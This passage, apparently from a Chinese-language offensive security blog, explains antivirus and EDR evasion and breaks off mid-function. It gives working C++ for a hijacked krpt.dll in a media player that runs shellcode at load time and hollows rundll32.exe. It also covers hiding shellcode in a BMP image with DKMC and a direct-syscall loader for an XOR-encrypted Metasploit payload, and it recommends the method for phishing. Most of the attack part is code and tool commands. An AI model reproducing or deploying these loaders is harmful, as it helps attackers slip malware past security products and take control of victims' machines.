&#x6253;&#x5F00;powertools&#xFF0C;&#x8FD0;&#x884C;exe&#xFF0C;&#x627E;&#x5230;&#x90A3;&#x4E2A;exe&#x5F15;&#x5165;&#x7684;dll&#x6587;&#x4EF6;
</code></pre><p><a href="https://imgse.com/i/ppTow2F" target="_blank"><img src="https://s1.ax1x.com/2023/04/07/ppTow2F.png" alt="ppTow2F.png"></a></p>
<p>&#x56E0;&#x4E3A;kk&#x64AD;&#x653E;&#x5668;&#x662F;&#x7684;dll&#x662F;32&#x4F4D;&#x7684;&#xFF0C;&#x6545;&#x6211;&#x4EEC;&#x751F;&#x6210;&#x7684;dll&#x4E5F;&#x662F;32&#x4F4D;&#x7684;</p>
<pre><code class="lang-c++"><span class="hljs-comment">// dllmain.cpp : &#x5B9A;&#x4E49; DLL &#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x7684;&#x5165;&#x53E3;&#x70B9;&#x3002;</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;windows.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;iostream&gt;</span></span>

HANDLE My_hThread = <span class="hljs-literal">NULL</span>;
<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> shellcode[] = <span class="hljs-string">&quot;\xfc&quot;</span>;
<span class="hljs-function">DWORD  WINAPI  <span class="hljs-title">ceshi</span><span class="hljs-params">(LPVOID pParameter)</span>
</span>{
    __asm
    {
        mov eax, offset shellcode
        jmp eax
    }
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
<span class="hljs-function">BOOL APIENTRY <span class="hljs-title">DllMain</span><span class="hljs-params">(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)</span>
</span>{
    <span class="hljs-keyword">switch</span> (ul_reason_for_call)
    {
    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<span class="hljs-comment">//&#x521D;&#x6B21;&#x8C03;&#x7528;dll&#x65F6;&#x6267;&#x884C;&#x4E0B;&#x9762;&#x4EE3;&#x7801;</span>
        My_hThread = ::CreateThread(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, &amp;ceshi, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<span class="hljs-comment">//&#x65B0;&#x5EFA;&#x7EBF;&#x7A0B;</span>
    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:
    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:
    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:
        <span class="hljs-keyword">break</span>;
    }
    <span class="hljs-keyword">return</span> TRUE;
}
<span class="hljs-keyword">extern</span><span class="hljs-string">&quot;C&quot;</span> _declspec(dllexport) <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">test</span><span class="hljs-params">()</span>
</span>{
    <span class="hljs-keyword">int</span> a;
    a = <span class="hljs-number">0</span>;
}
</code></pre>
<p>&#x5229;&#x7528;studype&#x5DE5;&#x5177;&#xFF0C;&#x5C06;&#x6211;&#x4EEC;&#x751F;&#x6210;&#x7684;dll&#x5BFC;&#x5165;&#x5230;&#x5176;dll&#x7684;&#x51FD;&#x6570;</p>
<p>&#x7136;&#x540E;&#x8FD0;&#x884C;kk&#x64AD;&#x653E;&#x5668;&#x5C31;&#x52A0;&#x8F7D;&#x4E86;&#x539F;&#x6709;dll&#xFF0C;&#x8BE5;dll&#x7684;&#x5BFC;&#x5165;&#x51FD;&#x6570;&#x4E2D;&#x6709;&#x6211;&#x4EEC;&#x7684;&#x6076;&#x610F;dll&#xFF0C;&#x6545;&#x800C;&#x52A0;&#x8F7D;&#x6211;&#x4EEC;&#x7684;dll&#x7684;&#x51FD;&#x6570;&#xFF0C;&#x5B9E;&#x73B0;&#x4E0A;&#x7EBF;</p>
<p><a href="https://imgse.com/i/ppTohxe" target="_blank"><img src="https://s1.ax1x.com/2023/04/07/ppTohxe.png" alt="ppTohxe.png"></a></p>
<h5 id="&#x5BFC;&#x51FA;&#x7F16;&#x8BD1;">&#x5BFC;&#x51FA;&#x7F16;&#x8BD1;</h5>
<p>&#x5229;&#x7528;dependencies&#x5DE5;&#x5177;&#x5BFC;&#x51FA;krpt.dll</p>
<p><a href="https://imgse.com/i/ppTbBJx" target="_blank"><img src="https://s1.ax1x.com/2023/04/07/ppTbBJx.png" alt="ppTbBJx.png"></a></p>
<p>&#x53F3;&#x952E;&#x90A3;&#x91CC;&#x5BFC;&#x51FA;&#xFF0C;&#x5BFC;&#x51FA;&#x4E4B;&#x540E;&#x662F;&#x8FD9;&#x4E09;&#x4E2A;&#x6587;&#x4EF6;</p>
<p><a href="https://imgse.com/i/ppTb6yD" target="_blank"><img src="https://s1.ax1x.com/2023/04/07/ppTb6yD.png" alt="ppTb6yD.png"></a></p>
<p>&#x6DFB;&#x52A0;&#x5230;vs2022&#x7684;&#x6E90;&#x6587;&#x4EF6;&#x548C;&#x5934;&#x6587;&#x4EF6;&#x91CC;&#xFF0C;&#x6E90;&#x6587;&#x4EF6;&#x628A;&#x8FD9;&#x4E09;&#x4E2A;&#x590D;&#x5236;&#x8FC7;&#x53BB;&#xFF0C;&#x5934;&#x6587;&#x4EF6;&#x53F3;&#x952E;&#x6DFB;&#x52A0;&#x73B0;&#x6709;&#x9879;&#x5BFC;&#x5165;</p>
<p><a href="https://imgse.com/i/ppTb5fP" target="_blank"><img src="https://s1.ax1x.com/2023/04/07/ppTb5fP.png" alt="ppTb5fP.png"></a></p>
<p>1&#xFF09;&#x5C06;&#x6240;&#x6709;&#x7684;jmp&#x8BED;&#x53E5;&#x53BB;&#x6389;</p>
<p><a href="https://imgse.com/i/ppTbLwj" target="_blank"><img src="https://s1.ax1x.com/2023/04/07/ppTbLwj.png" alt="ppTbLwj.png"></a></p>
<p>2&#xFF09;</p>
<p><a href="https://imgse.com/i/ppTbjkn" target="_blank"><img src="https://s1.ax1x.com/2023/04/07/ppTbjkn.png" alt="ppTbjkn.png"></a></p>
<p><a href="https://imgse.com/i/ppTq96U" target="_blank"><img src="https://s1.ax1x.com/2023/04/07/ppTq96U.png" alt="ppTq96U.png"></a></p>
<p>3&#xFF09;&#x547D;&#x4EE4;&#x884C;&#x8F93;&#x5165;</p>
<pre><code>&#x547D;&#x4EE4;&#x884C;: ml /Fo $(IntDir)%(fileName).obj /c /Cp %(fileName).asm
&#x8F93;&#x51FA;: $(IntDir)%(fileName).obj;%(Outputs)
</code></pre><p><a href="https://imgse.com/i/ppTqim4" target="_blank"><img src="https://s1.ax1x.com/2023/04/07/ppTqim4.png" alt="ppTqim4.png"></a></p>
<p>4&#xFF09;</p>
<p><a href="https://imgse.com/i/ppTqVt1" target="_blank"><img src="https://s1.ax1x.com/2023/04/07/ppTqVt1.png" alt="ppTqVt1.png"></a><a href="https://imgse.com/i/ppTqZfx" target="_blank"><img src="https://s1.ax1x.com/2023/04/07/ppTqZfx.png" alt="ppTqZfx.png"></a></p>
<p><a href="https://imgse.com/i/ppTqQne" target="_blank"><img src="https://s1.ax1x.com/2023/04/07/ppTqQne.png" alt="ppTqQne.png"></a></p>
<p>5&#xFF09;&#x5199;&#x5165;&#x4E0A;&#x7EBF;shellcode</p>
<pre><code class="lang-c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-string">&quot;krpt.h&quot;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-string">&quot;windows.h&quot;</span></span>

<span class="hljs-function">BOOL APIENTRY <span class="hljs-title">DllMain</span><span class="hljs-params">(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)</span>
</span>{
    <span class="hljs-keyword">switch</span> (ul_reason_for_call)
    {
    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:
    {
        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> hexData[] = <span class="hljs-string">&quot;\xfc\xe8&quot;</span>;

        <span class="hljs-keyword">char</span>* v7A = (<span class="hljs-keyword">char</span>*)VirtualAlloc(<span class="hljs-number">0</span>, _countof(hexData), <span class="hljs-number">0x3000</span>u, <span class="hljs-number">0x40</span>u);
        <span class="hljs-built_in">memcpy</span>((<span class="hljs-keyword">void</span>*)v7A, hexData, _countof(hexData));

        <span class="hljs-keyword">struct</span> _PROCESS_INFORMATION ProcessInformation;
        <span class="hljs-keyword">struct</span> _STARTUPINFOA StartupInfo;
        <span class="hljs-keyword">void</span>* v24;
        CONTEXT Context;
        DWORD DwWrite = <span class="hljs-number">0</span>;
        <span class="hljs-built_in">memset</span>(&amp;StartupInfo, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(StartupInfo));
        StartupInfo.cb = <span class="hljs-number">68</span>;
        BOOL result = CreateProcessA(<span class="hljs-number">0</span>, (LPSTR)<span class="hljs-string">&quot;rundll32.exe&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0x44</span>u, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, &amp;StartupInfo, &amp;ProcessInformation);
        <span class="hljs-keyword">if</span> (result)
        {
            Context.ContextFlags = <span class="hljs-number">65539</span>;
            GetThreadContext(ProcessInformation.hThread, &amp;Context);
            v24 = VirtualAllocEx(ProcessInformation.hProcess, <span class="hljs-number">0</span>, _countof(hexData), <span class="hljs-number">0x1000</span>u, <span class="hljs-number">0x40</span>u);
            WriteProcessMemory(ProcessInformation.hProcess, v24, v7A, _countof(hexData), &amp;DwWrite);
            Context.Eip = (DWORD)v24;
            SetThreadContext(ProcessInformation.hThread, &amp;Context);
            ResumeThread(ProcessInformation.hThread);
            CloseHandle(ProcessInformation.hThread);
            result = CloseHandle(ProcessInformation.hProcess);
        }


        TerminateProcess(GetCurrentProcess(), <span class="hljs-number">0</span>);
    };

    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:
    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:
    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:
        <span class="hljs-keyword">break</span>;
    }
    <span class="hljs-keyword">return</span> TRUE;
}
</code></pre>
<p>&#x7F16;&#x8BD1;&#x6210;krpt.dll&#xFF0C;&#x653E;&#x5728;&#x4E00;&#x4E2A;&#x76EE;&#x5F55;&#x4E0B;&#x8FD0;&#x884C;&#x4E0A;&#x7EBF;</p>
<p><a href="https://imgse.com/i/ppTbtL4" target="_blank"><img src="https://s1.ax1x.com/2023/04/07/ppTbtL4.png" alt="ppTbtL4.png"></a></p>
<p>&#x4F46;&#x662F;&#x4EE5;&#x4E0A;&#x5F88;&#x5BB9;&#x6613;&#x88AB;&#x6740;&#xFF0C;&#x6545;&#x6211;&#x4EEC;&#x8981;&#x5206;&#x79BB;</p>
<h5 id="&#x56FE;&#x7247;&#x5206;&#x79BB;">&#x56FE;&#x7247;&#x5206;&#x79BB;</h5>
<p>&#x5229;&#x7528;DKMC&#x5DE5;&#x5177;&#x5C06;shellcode&#x9690;&#x5199;&#x5728;&#x56FE;&#x7247;&#x4E2D;</p>
<pre><code>python2 dkmc.py
gen
set shellcode xxx
</code></pre><p><a href="https://imgse.com/i/ppTXBHe" target="_blank"><img src="https://s1.ax1x.com/2023/04/07/ppTXBHe.png" alt="ppTXBHe.png"></a></p>
<p>&#x6E90;&#x4EE3;&#x7801;</p>
<pre><code class="lang-c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-string">&quot;framework.h&quot;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-string">&quot;windows.h&quot;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-string">&quot;krpt.h&quot;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>


<span class="hljs-function">BOOL APIENTRY <span class="hljs-title">DllMain</span><span class="hljs-params">(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)</span>
</span>{
    <span class="hljs-keyword">switch</span> (ul_reason_for_call)
    {
    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:
    {
        FILE* fp;  <span class="hljs-comment">// &#x5B9A;&#x4E49;&#x6D41;&#x5F0F;&#x6587;&#x4EF6;&#x64CD;&#x4F5C;&#x53D8;&#x91CF;fp&#xFF0C;FILE&#x7ED3;&#x6784;&#x4F53;&#x5728;stdio.h&#x91CC;&#x9762;&#x6709;&#x5B9A;&#x4E49;</span>
        <span class="hljs-keyword">size_t</span> size;  <span class="hljs-comment">// &#x5B9A;&#x4E49;&#x6587;&#x4EF6;&#x5B57;&#x8282;&#x6570;&#x53D8;&#x91CF;size</span>
        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>* buffer;  <span class="hljs-comment">// &#x5B9A;&#x4E49;&#x7F13;&#x5B58;&#x6307;&#x9488;&#x53D8;&#x91CF;</span>

        fp = fopen(<span class="hljs-string">&quot;batmanfuture.bmp&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>);
        <span class="hljs-comment">// fseek()&#x8D1F;&#x53F7;&#x524D;&#x79FB;&#xFF0C;&#x6B63;&#x53F7;&#x540E;&#x79FB;</span>
        fseek(fp, <span class="hljs-number">0</span>, SEEK_END);          <span class="hljs-comment">// &#x6587;&#x4EF6;&#x6307;&#x9488;&#x6307;&#x5411;&#x6587;&#x4EF6;&#x672B;&#x5C3E;</span>
        <span class="hljs-comment">// ftell()&#x8FD4;&#x56DE;&#x7ED9;&#x5B9A;&#x6D41; stream &#x7684;&#x5F53;&#x524D;&#x6587;&#x4EF6;&#x4F4D;&#x7F6E;</span>
        size = ftell(fp);                <span class="hljs-comment">// size&#x503C;&#x4E3A;&#x6587;&#x4EF6;&#x5927;&#x5C0F;</span>
        fseek(fp, <span class="hljs-number">0</span>, SEEK_SET);          <span class="hljs-comment">// &#x6587;&#x4EF6;&#x6307;&#x9488;&#x6307;&#x5411;&#x6587;&#x4EF6;&#x5F00;&#x5934;</span>
        buffer = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>*)<span class="hljs-built_in">malloc</span>(size);    <span class="hljs-comment">// &#x52A8;&#x6001;&#x7533;&#x8BF7;&#x56FE;&#x7247;&#x5927;&#x5C0F;&#x7684;&#x5185;&#x5B58;&#x7A7A;&#x95F4;&#xFF08;&#x6570;&#x7EC4;&#x6307;&#x9488;&#xFF09;</span>
        fread(buffer, size, <span class="hljs-number">1</span>, fp);  <span class="hljs-comment">// &#x4ECE;fp&#x8BFB;&#x53D6;&#x548C;&#x663E;&#x793A;1&#x4E2A;size&#x5927;&#x5C0F;&#x7684;&#x6570;&#x636E;</span>

        <span class="hljs-keyword">char</span>* v7A = (<span class="hljs-keyword">char</span>*)VirtualAlloc(<span class="hljs-number">0</span>, size, <span class="hljs-number">0x3000</span>u, <span class="hljs-number">0x40</span>u);
        <span class="hljs-built_in">memcpy</span>((<span class="hljs-keyword">void</span>*)v7A, buffer, size);

        <span class="hljs-keyword">struct</span> _PROCESS_INFORMATION ProcessInformation;
        <span class="hljs-keyword">struct</span> _STARTUPINFOA StartupInfo;
        <span class="hljs-keyword">void</span>* v24;
        CONTEXT Context;
        DWORD DwWrite = <span class="hljs-number">0</span>;
        <span class="hljs-built_in">memset</span>(&amp;StartupInfo, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(StartupInfo));
        StartupInfo.cb = <span class="hljs-number">68</span>;
        BOOL result = CreateProcessA(<span class="hljs-number">0</span>, (LPSTR)<span class="hljs-string">&quot;rundll32.exe&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0x44</span>u, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, &amp;StartupInfo, &amp;ProcessInformation);
        <span class="hljs-keyword">if</span> (result)
        {
            Context.ContextFlags = <span class="hljs-number">65539</span>;
            GetThreadContext(ProcessInformation.hThread, &amp;Context);
            v24 = VirtualAllocEx(ProcessInformation.hProcess, <span class="hljs-number">0</span>, size, <span class="hljs-number">0x1000</span>u, <span class="hljs-number">0x40</span>u);
            WriteProcessMemory(ProcessInformation.hProcess, v24, v7A, size, &amp;DwWrite);
            Context.Eip = (DWORD)v24;
            SetThreadContext(ProcessInformation.hThread, &amp;Context);
            ResumeThread(ProcessInformation.hThread);
            CloseHandle(ProcessInformation.hThread);
            result = CloseHandle(ProcessInformation.hProcess);
        }


        TerminateProcess(GetCurrentProcess(), <span class="hljs-number">0</span>);
    };
    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:
    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:
    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:
        <span class="hljs-keyword">break</span>;
    }
    <span class="hljs-keyword">return</span> TRUE;
}
</code></pre>
<p>&#x7F16;&#x8BD1;&#xFF0C;&#x62A5;&#x4E86;&#x4E2A;&#x9519;&#x8BEF;</p>
<p><a href="https://imgse.com/i/ppTjFv6" target="_blank"><img src="https://s1.ax1x.com/2023/04/07/ppTjFv6.png" alt="ppTjFv6.png"></a></p>
<p><a href="https://blog.csdn.net/weixin_44788542/article/details/116235303" target="_blank">https://blog.csdn.net/weixin_44788542/article/details/116235303</a></p>
<pre><code>_CRT_SECURE_NO_WARNINGS
</code></pre><p><a href="https://imgse.com/i/ppTjhxx" target="_blank"><img src="https://s1.ax1x.com/2023/04/07/ppTjhxx.png" alt="ppTjhxx.png"></a></p>
<p>&#x91CD;&#x65B0;&#x7F16;&#x8BD1;&#x751F;&#x6210;&#xFF0C;&#x5C06;xxx.dll&#x548C;&#x56FE;&#x7247;&#xFF0C;&#x8FD8;&#x6709;xxx.exe&#x653E;&#x5728;&#x4E00;&#x8D77;</p>
<p>&#x8FD0;&#x884C;&#x76F4;&#x63A5;&#x4E0A;&#x7EBF;</p>
<p><img src="https://s1.imagehub.cc/images/2023/04/07/a35df380acf6c77db1971584164166d6.png" alt="a35df380acf6c77db1971584164166d6.png"></p>
<p><img src="https://s1.imagehub.cc/images/2023/04/07/ff7f8b8484ed7ed1768bd388262e877e.png" alt="ff7f8b8484ed7ed1768bd388262e877e.png"></p>
<p>.</p>
<p>&#x9002;&#x7528;&#x4E8E;&#x9493;&#x9C7C;&#x5F0F;</p>
<h3 id="syscall">syscall</h3>
<p><a href="https://j00ru.vexillium.org/syscalls/nt/64/" target="_blank">https://j00ru.vexillium.org/syscalls/nt/64/</a></p>
<p>&#x5728;msf&#x4E2D;&#x751F;&#x6210;&#x4E00;&#x4E2A;payload.bin</p>
<p>&#x5728;</p>
<pre><code>EDR-Bypass-demo-main\EDR-Bypass-demo-main\chapter4-demo2
</code></pre><p>&#x4E2D;&#x4FEE;&#x6539;enc.py&#x91CC;&#x7684;1.txt&#x4F4D;payload.bin&#xFF0C;&#x6267;&#x884C;python enc.py&#x751F;&#x6210;&#x4E86;&#x52A0;&#x5BC6;&#x540E;&#x5BF9;&#x7684;shellcode</p>
<pre><code class="lang-c++"><span class="hljs-comment">// demo1.cpp : This file contains the &apos;main&apos; function. Program execution begins and ends there.</span>
<span class="hljs-comment">//</span>

<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-string">&quot;header.h&quot;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-string">&quot;base64.h&quot;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-string">&quot;nt.h&quot;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;

<span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>* <span class="hljs-title">ReadProcessBlob</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* fnamSc, DWORD* szSc)</span>
</span>{
    DWORD szRead{ <span class="hljs-number">0</span> };

    HANDLE hFile = CreateFileA(
        fnamSc,
        GENERIC_READ,
        <span class="hljs-literal">NULL</span>,
        <span class="hljs-literal">NULL</span>,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        <span class="hljs-literal">NULL</span>
    );

    <span class="hljs-keyword">if</span> (INVALID_HANDLE_VALUE == hFile)
        <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;

    SIZE_T szFile = GetFileSize(hFile, <span class="hljs-literal">NULL</span>);
    *szSc = szFile;

    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>* raw = <span class="hljs-keyword">new</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>[szFile];
    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>* sc = <span class="hljs-keyword">new</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>[szFile];

    <span class="hljs-keyword">if</span> (!ReadFile(hFile, raw, szFile, &amp;szRead, <span class="hljs-literal">NULL</span>))
        <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;

    <span class="hljs-keyword">int</span> i;

    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; szRead; i++) {
        sc[i] = raw[i] ^ XOR_KEY;
    }

    <span class="hljs-keyword">return</span> sc;
}


<span class="hljs-built_in">std</span>::<span class="hljs-function"><span class="hljs-built_in">string</span> <span class="hljs-title">replace</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>&amp; inStr, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* pSrc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* pReplace)</span>

</span>{
    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> str = inStr;
    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>::size_type stStart = <span class="hljs-number">0</span>;
    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>::iterator iter = str.begin();
    <span class="hljs-keyword">while</span> (iter != str.end())

    {
        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>::size_type st = str.find(pSrc, stStart);

        <span class="hljs-keyword">if</span> (st == str.npos)

        {
            <span class="hljs-keyword">break</span>;
        }

        iter = iter + st - stStart;
        str.replace(iter, iter + <span class="hljs-built_in">strlen</span>(pSrc), pReplace);
        iter = iter + <span class="hljs-built_in">strlen</span>(pReplace);
        stStart = st + <span class="hljs-built_in">strlen</span>(pReplace);
    }

    <span class="hljs-keyword">return</span> str;

}

<span class="hljs-function">LPVOID <span class="hljs-title">GetSuitableBaseAddress</span><span class="hljs-params">(HANDLE hProc, DWORD szPage, DWORD szAllocGran, DWORD cVmResv)</span>
</span>{
    MEMORY_BASIC_INFORMATION mbi;

    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> base : VC_PREF_BASES) {
        VirtualQueryEx(
            hProc,
            base,
            &amp;mbi,
            <span class="hljs-keyword">sizeof</span>(MEMORY_BASIC_INFORMATION)
        );

        <span class="hljs-keyword">if</span> (MEM_FREE == mbi.State) {
            <span class="hljs-keyword">uint64_t</span> i;
            <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; cVmResv; ++i) {
                LPVOID currentBase = (<span class="hljs-keyword">void</span>*)((DWORD_PTR)base + (i * szAllocGran));
                VirtualQueryEx(
                    hProc,
                    currentBase,
                    &amp;mbi,
                    <span class="hljs-keyword">sizeof</span>(MEMORY_BASIC_INFORMATION)
                );
                <span class="hljs-keyword">if</span> (MEM_FREE != mbi.State)
                    <span class="hljs-keyword">break</span>;
            }
            <span class="hljs-keyword">if</span> (i == cVmResv) {
                <span class="hljs-comment">// found suitable base</span>
                <span class="hljs-keyword">return</span> base;
            }
        }
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;
}

<span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> _M_IX86</span>

<span class="hljs-function">EXTERN_C PVOID <span class="hljs-title">internal_cleancall_wow64_gate</span><span class="hljs-params">(VOID)</span> </span>{
    <span class="hljs-keyword">return</span> (PVOID)__readfsdword(<span class="hljs-number">0xC0</span>);
}

__declspec(naked) <span class="hljs-function">BOOL <span class="hljs-title">local_is_wow64</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span>
</span>{
    __asm {
        mov eax, fs: [<span class="hljs-number">0xc0</span>]
        test eax, eax
        jne wow64
        mov eax, <span class="hljs-number">0</span>
        ret
        wow64 :
        mov eax, <span class="hljs-number">1</span>
            ret
    }
}


<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span>

<span class="hljs-comment">// Code below is adapted from @modexpblog. Read linked article for more details.</span>
<span class="hljs-comment">// https://www.mdsec.co.uk/2020/12/bypassing-user-mode-hooks-and-direct-invocation-of-system-calls-for-red-teams</span>

SW3_SYSCALL_LIST SW3_SyscallList;

<span class="hljs-comment">// SEARCH_AND_REPLACE</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> SEARCH_AND_REPLACE</span>
<span class="hljs-comment">// THIS IS NOT DEFINED HERE; don&apos;t know if I&apos;ll add it in a future release</span>
<span class="hljs-function">EXTERN <span class="hljs-keyword">void</span> <span class="hljs-title">SearchAndReplace</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>[], <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>[])</span></span>;
<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span>

<span class="hljs-function">DWORD <span class="hljs-title">SW3_HashSyscall</span><span class="hljs-params">(PCSTR FunctionName)</span>
</span>{
    DWORD i = <span class="hljs-number">0</span>;
    DWORD Hash = SW3_SEED;

    <span class="hljs-keyword">while</span> (FunctionName[i])
    {
        WORD PartialName = *(WORD*)((ULONG_PTR)FunctionName + i++);
        Hash ^= PartialName + SW3_ROR8(Hash);
    }

    <span class="hljs-keyword">return</span> Hash;
}

<span class="hljs-meta">#<span class="hljs-meta-keyword">ifndef</span> JUMPER</span>
<span class="hljs-function">PVOID <span class="hljs-title">SC_Address</span><span class="hljs-params">(PVOID NtApiAddress)</span>
</span>{
    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;
}
<span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span>
<span class="hljs-function">PVOID <span class="hljs-title">SC_Address</span><span class="hljs-params">(PVOID NtApiAddress)</span>
</span>{
    DWORD searchLimit = <span class="hljs-number">512</span>;
    PVOID SyscallAddress;

<span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> _WIN64</span>
    <span class="hljs-comment">// If the process is 64-bit on a 64-bit OS, we need to search for syscall</span>
    BYTE syscall_code[] = { <span class="hljs-number">0x0f</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0xc3</span> };
    ULONG distance_to_syscall = <span class="hljs-number">0x12</span>;
<span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span>
    <span class="hljs-comment">// If the process is 32-bit on a 32-bit OS, we need to search for sysenter</span>
    BYTE syscall_code[] = { <span class="hljs-number">0x0f</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0xc3</span> };
    ULONG distance_to_syscall = <span class="hljs-number">0x0f</span>;
<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span>

<span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> _M_IX86</span>
    <span class="hljs-comment">// If the process is 32-bit on a 64-bit OS, we need to jump to WOW32Reserved</span>
    <span class="hljs-keyword">if</span> (local_is_wow64())
    {
<span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> DEBUG</span>
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Running 32-bit app on x64 (WOW64)\n&quot;</span>);
<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;
    }
<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span>

    <span class="hljs-comment">// we don&apos;t really care if there is a &apos;jmp&apos; between</span>
    <span class="hljs-comment">// NtApiAddress and the &apos;syscall; ret&apos; instructions</span>
    SyscallAddress = SW3_RVA2VA(PVOID, NtApiAddress, distance_to_syscall);

    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">memcmp</span>((PVOID)syscall_code, SyscallAddress, <span class="hljs-keyword">sizeof</span>(syscall_code)))
    {
        <span class="hljs-comment">// we can use the original code for this system call :)</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> defined(DEBUG)</span>
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Found Syscall Opcodes at address 0x%p\n&quot;</span>, SyscallAddress);
<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span>
        <span class="hljs-keyword">return</span> SyscallAddress;
    }

    <span class="hljs-comment">// the &apos;syscall; ret&apos; intructions have not been found,</span>
    <span class="hljs-comment">// we will try to use one near it, similarly to HalosGate</span>

    <span class="hljs-keyword">for</span> (ULONG32 num_jumps = <span class="hljs-number">1</span>; num_jumps &lt; searchLimit; num_jumps++)
    {
        <span class="hljs-comment">// let&apos;s try with an Nt* API below our syscall</span>
